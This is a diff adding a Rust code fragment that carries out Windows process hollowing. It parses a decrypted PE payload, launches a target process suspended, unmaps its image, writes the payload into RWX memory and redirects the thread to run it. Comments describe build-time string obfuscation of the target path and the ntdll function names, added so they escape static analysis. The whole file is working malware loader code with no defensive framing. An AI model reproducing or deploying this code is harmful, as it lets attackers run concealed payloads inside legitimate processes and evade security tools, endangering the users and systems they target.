@@ -1,0 +1,410 @@
+// --- Process hollowing (technique fragment) ---
+
+use windows::core::PSTR;
+use windows::Win32::Foundation::{CloseHandle, BOOL, HANDLE};
+use windows::Win32::System::Diagnostics::Debug::{
+    GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
+    CONTEXT_FULL_AMD64,
+};
+use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+use windows::Win32::System::Memory::{
+    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VIRTUAL_ALLOCATION_TYPE,
+};
+use windows::Win32::System::Threading::{
+    CreateProcessA, GetExitCodeProcess, ResumeThread, WaitForSingleObject, CREATE_SUSPENDED,
+    PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA,
+};
+
+/// Signature of `NtUnmapViewOfSection` (ntdll.dll), resolved dynamically.
+type NtUnmapViewOfSectionFn = unsafe extern "system" fn(HANDLE, *const core::ffi::c_void) -> i32;
+
+// --- PE constants ---
+const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
+const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
+const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
+
+/// Minimal section header view.
+struct Section {
+    virtual_size: u32,
+    virtual_address: u32,
+    size_of_raw_data: u32,
+    pointer_to_raw_data: u32,
+}
+
+/// Minimal PE view.
+struct Pe {
+    image_base: u64,
+    size_of_image: u32,
+    size_of_headers: u32,
+    entry_point_rva: u32,
+    sections: Vec<Section>,
+    reloc_rva: u32,
+    reloc_size: u32,
+}
+
+/// Runs the decrypted payload via process hollowing and returns its exit code.
+///
+/// The hollowing target path is substituted at build time by
+/// `Params::render_fragment` with code that rebuilds the string at runtime, so
+/// it never appears in `strings`.
+fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
+    let hollow_target = HOLLOW_TARGET_DEF;
+    let pe = parse_pe(image)?;
+    let process = run_stage_two(&hollow_target, image, &pe)?;
+    Ok(wait_and_exit(process))
+}
+
+// --- Minimal PE parsing (offsets relative to the decrypted image) ---
+
+fn parse_pe(image: &[u8]) -> Result<Pe, String> {
+    if image.len() < 64 {
+        return Err("payload too small to be a PE".to_string());
+    }
+    if read_u16(image, 0)? != IMAGE_DOS_SIGNATURE {
+        return Err("invalid DOS header (missing MZ signature)".to_string());
+    }
+    let e_lfanew = read_u32(image, 0x3C)? as usize;
+    if read_u32(image, e_lfanew)? != IMAGE_NT_SIGNATURE {
+        return Err("invalid NT header (missing PE signature)".to_string());
+    }
+
+    let machine = read_u16(image, e_lfanew + 4)?;
+    if machine != IMAGE_FILE_MACHINE_AMD64 {
+        return Err(format!(
+            "unsupported architecture (machine 0x{machine:04x}); expected x64"
+        ));
+    }
+
+    let num_sections = read_u16(image, e_lfanew + 6)? as usize;
+    let size_of_optional_header = read_u16(image, e_lfanew + 20)? as usize;
+
+    let opt = e_lfanew + 4 + 20;
+    let entry_point_rva = read_u32(image, opt + 16)?;
+    let image_base = read_u64(image, opt + 24)?;
+    let size_of_image = read_u32(image, opt + 56)?;
+    let size_of_headers = read_u32(image, opt + 60)?;
+
+    // Base relocation directory (data directory index 5).
+    let num_dirs = read_u32(image, opt + 108)?;
+    let (reloc_rva, reloc_size) = if num_dirs > 5 {
+        (read_u32(image, opt + 152)?, read_u32(image, opt + 156)?)
+    } else {
+        (0, 0)
+    };
+
+    let section_table = opt + size_of_optional_header;
+    let mut sections = Vec::with_capacity(num_sections);
+    for i in 0..num_sections {
+        let s = section_table + i * 40;
+        if s + 40 > image.len() {
+            return Err("section table out of bounds".to_string());
+        }
+        sections.push(Section {
+            virtual_size: read_u32(image, s + 8)?,
+            virtual_address: read_u32(image, s + 12)?,
+            size_of_raw_data: read_u32(image, s + 16)?,
+            pointer_to_raw_data: read_u32(image, s + 20)?,
+        });
+    }
+
+    Ok(Pe {
+        image_base,
+        size_of_image,
+        size_of_headers,
+        entry_point_rva,
+        sections,
+        reloc_rva,
+        reloc_size,
+    })
+}
+
+fn rva_to_offset(pe: &Pe, rva: u32) -> Option<usize> {
+    for sec in &pe.sections {
+        let size = sec.virtual_size.max(sec.size_of_raw_data);
+        if rva >= sec.virtual_address && rva < sec.virtual_address + size {
+            return Some((rva - sec.virtual_address + sec.pointer_to_raw_data) as usize);
+        }
+    }
+    None
+}
+
+fn apply_relocations(image: &mut [u8], pe: &Pe, delta: isize) -> Result<(), String> {
+    if pe.reloc_size == 0 {
+        return Ok(());
+    }
+    let start = rva_to_offset(pe, pe.reloc_rva)
+        .ok_or_else(|| "could not map the relocation table to a file offset".to_string())?;
+    let end = start + pe.reloc_size as usize;
+    if end > image.len() {
+        return Err("relocation table out of bounds".to_string());
+    }
+
+    let mut off = start;
+    while off + 8 <= end {
+        let page_rva = read_u32(image, off)?;
+        let block_size = read_u32(image, off + 4)?;
+        if block_size < 8 || off + block_size as usize > end {
+            return Err("malformed relocation block".to_string());
+        }
+        let count = (block_size - 8) / 2;
+        for i in 0..count {
+            let entry = read_u16(image, off + 8 + (i * 2) as usize)?;
+            let typ = entry >> 12;
+            let rva = page_rva + (entry & 0xFFF) as u32;
+            let file_off = match rva_to_offset(pe, rva) {
+                Some(o) => o,
+                None => continue,
+            };
+            match typ {
+                // IMAGE_REL_BASED_DIR64: patch a 64-bit field.
+                3 => {
+                    let v = read_u64(image, file_off)?;
+                    write_u64(image, file_off, (v as isize + delta) as u64)?;
+                }
+                // IMAGE_REL_BASED_HIGHLOW: patch a 32-bit field.
+                10 => {
+                    let v = read_u32(image, file_off)?;
+                    write_u32(image, file_off, (v as isize + delta) as u32)?;
+                }
+                // ABSOLUTE and everything else: skip.
+                _ => {}
+            }
+        }
+        off += block_size as usize;
+    }
+    Ok(())
+}
+
+fn run_stage_two(target: &str, image: &mut [u8], pe: &Pe) -> Result<HANDLE, String> {
+    // 1. Create the target process suspended.
+    let (process, thread) = spawn_suspended(target)?;
+
+    // 2. Read its image base from the PEB.
+    let base = resolve_image_base(process, thread)?;
+
+    // 3. Unmap the original image.
+    let unmap = resolve_unmap()?;
+    let status = unsafe { unmap(process, base as *const core::ffi::c_void) };
+    if status < 0 {
+        return Err(format!("unmap failed (0x{:08x})", status as u32));
+    }
+
+    // 4. Re-allocate memory at the same base.
+    let alloc = unsafe {
+        VirtualAllocEx(
+            process,
+            Some(base as *const core::ffi::c_void),
+            pe.size_of_image as usize,
+            VIRTUAL_ALLOCATION_TYPE(MEM_COMMIT.0 | MEM_RESERVE.0),
+            PAGE_EXECUTE_READWRITE,
+        )
+    };
+    if alloc.is_null() {
+        return Err("VirtualAllocEx failed".to_string());
+    }
+
+    // 5. Fix up relocations if the base differs from the preferred one.
+    let delta = base as isize - pe.image_base as isize;
+    if delta != 0 {
+        apply_relocations(image, pe, delta)?;
+    }
+
+    // 6. Write the image.
+    write_image(process, base, image, pe)?;
+
+    // 7. Redirect the thread to the payload entry point.
+    redirect_entry(thread, base, pe.entry_point_rva)?;
+
+    // 8. Resume the thread and keep only the process handle.
+    if unsafe { ResumeThread(thread) } == u32::MAX {
+        return Err("ResumeThread failed".to_string());
+    }
+    unsafe {
+        let _ = CloseHandle(thread);
+    }
+
+    Ok(process)
+}
+
+fn spawn_suspended(target: &str) -> Result<(HANDLE, HANDLE), String> {
+    let mut app = target.as_bytes().to_vec();
+    app.push(0);
+    let mut cmd = app.clone();
+
+    let mut startup: STARTUPINFOA = unsafe { std::mem::zeroed() };
+    startup.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
+    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
+
+    unsafe {
+        CreateProcessA(
+            PCSTR(app.as_ptr()),
+            PSTR(cmd.as_mut_ptr()),
+            None,
+            None,
+            BOOL(0),
+            CREATE_SUSPENDED,
+            None,
+            PCSTR::null(),
+            &startup,
+            &mut pi,
+        )
+    }
+    .map_err(|e| format!("CreateProcessA failed: {e}"))?;
+
+    Ok((pi.hProcess, pi.hThread))
+}
+
+fn resolve_image_base(process: HANDLE, thread: HANDLE) -> Result<u64, String> {
+    let mut ctx = CONTEXT::default();
+    ctx.ContextFlags = CONTEXT_FULL_AMD64;
+    unsafe { GetThreadContext(thread, &mut ctx) }
+        .map_err(|e| format!("GetThreadContext failed: {e}"))?;
+
+    // On x64, Rdx holds the PEB address; ImageBaseAddress sits at PEB + 0x10.
+    let peb = ctx.Rdx;
+    let mut base: u64 = 0;
+    unsafe {
+        ReadProcessMemory(
+            process,
+            (peb + 0x10) as *const core::ffi::c_void,
+            &mut base as *mut u64 as *mut core::ffi::c_void,
+            std::mem::size_of::<u64>(),
+            None,
+        )
+    }
+    .map_err(|e| format!("ReadProcessMemory failed: {e}"))?;
+
+    Ok(base)
+}
+
+fn write_image(process: HANDLE, base: u64, image: &[u8], pe: &Pe) -> Result<(), String> {
+    // Headers first.
+    write_remote(process, base, &image[..pe.size_of_headers as usize])?;
+    // Then each section.
+    for sec in &pe.sections {
+        let start = sec.pointer_to_raw_data as usize;
+        let end = start + sec.size_of_raw_data as usize;
+        if end > image.len() {
+            return Err("section data out of bounds".to_string());
+        }
+        write_remote(
+            process,
+            base + sec.virtual_address as u64,
+            &image[start..end],
+        )?;
+    }
+    Ok(())
+}
+
+fn write_remote(process: HANDLE, base: u64, data: &[u8]) -> Result<(), String> {
+    if data.is_empty() {
+        return Ok(());
+    }
+    unsafe {
+        WriteProcessMemory(
+            process,
+            base as *const core::ffi::c_void,
+            data.as_ptr() as *const core::ffi::c_void,
+            data.len(),
+            None,
+        )
+    }
+    .map_err(|e| format!("WriteProcessMemory failed: {e}"))
+}
+
+fn redirect_entry(thread: HANDLE, base: u64, entry_rva: u32) -> Result<(), String> {
+    let mut ctx = CONTEXT::default();
+    ctx.ContextFlags = CONTEXT_FULL_AMD64;
+    unsafe { GetThreadContext(thread, &mut ctx) }
+        .map_err(|e| format!("GetThreadContext failed: {e}"))?;
+    ctx.Rcx = base + entry_rva as u64;
+    unsafe { SetThreadContext(thread, &ctx) }
+        .map_err(|e| format!("SetThreadContext failed: {e}"))?;
+    Ok(())
+}
+
+fn resolve_unmap() -> Result<NtUnmapViewOfSectionFn, String> {
+    // `NTDLL_DEF` and `UNMAP_FUNC_DEF` are substituted at build time with code
+    // that rebuilds the names at runtime (obfuscated), so they do not appear
+    // in `strings`.
+    let ntdll = std::ffi::CString::new(NTDLL_DEF).map_err(|_| "invalid ntdll name".to_string())?;
+    let unmap =
+        std::ffi::CString::new(UNMAP_FUNC_DEF).map_err(|_| "invalid unmap name".to_string())?;
+
+    let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
+        .map_err(|e| format!("GetModuleHandleA failed: {e}"))?;
+    let proc = unsafe { GetProcAddress(module, PCSTR(unmap.as_ptr() as *const u8)) };
+    let proc = proc.ok_or_else(|| "GetProcAddress failed".to_string())?;
+    Ok(unsafe { std::mem::transmute(proc) })
+}
+
+fn wait_and_exit(process: HANDLE) -> i32 {
+    unsafe {
+        let _ = WaitForSingleObject(process, u32::MAX);
+        let mut code: u32 = 0;
+        let _ = GetExitCodeProcess(process, &mut code);
+        let _ = CloseHandle(process);
+        code as i32
+    }
+}
+
+// --- Bounds-checked little-endian reads/writes ---
+
+fn read_u16(b: &[u8], off: usize) -> Result<u16, String> {
+    let s = b
+        .get(
+            off..off
+                .checked_add(2)
+                .ok_or_else(|| "offset overflow".to_string())?,
+        )
+        .ok_or_else(|| "read out of bounds".to_string())?;
+    Ok(u16::from_le_bytes([s[0], s[1]]))
+}
+
+fn read_u32(b: &[u8], off: usize) -> Result<u32, String> {
+    let s = b
+        .get(
+            off..off
+                .checked_add(4)
+                .ok_or_else(|| "offset overflow".to_string())?,
+        )
+        .ok_or_else(|| "read out of bounds".to_string())?;
+    Ok(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
+}
+
+fn read_u64(b: &[u8], off: usize) -> Result<u64, String> {
+    let s = b
+        .get(
+            off..off
+                .checked_add(8)
+                .ok_or_else(|| "offset overflow".to_string())?,
+        )
+        .ok_or_else(|| "read out of bounds".to_string())?;
+    Ok(u64::from_le_bytes([
+        s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7],
+    ]))
+}
+
+fn write_u32(b: &mut [u8], off: usize, v: u32) -> Result<(), String> {
+    let s = b
+        .get_mut(
+            off..off
+                .checked_add(4)
+                .ok_or_else(|| "offset overflow".to_string())?,
+        )
+        .ok_or_else(|| "write out of bounds".to_string())?;
+    s.copy_from_slice(&v.to_le_bytes());
+    Ok(())
+}
+
+fn write_u64(b: &mut [u8], off: usize, v: u64) -> Result<(), String> {
+    let s = b
+        .get_mut(
+            off..off
+                .checked_add(8)
+                .ok_or_else(|| "offset overflow".to_string())?,
+        )
+        .ok_or_else(|| "write out of bounds".to_string())?;
+    s.copy_from_slice(&v.to_le_bytes());
+    Ok(())
+}
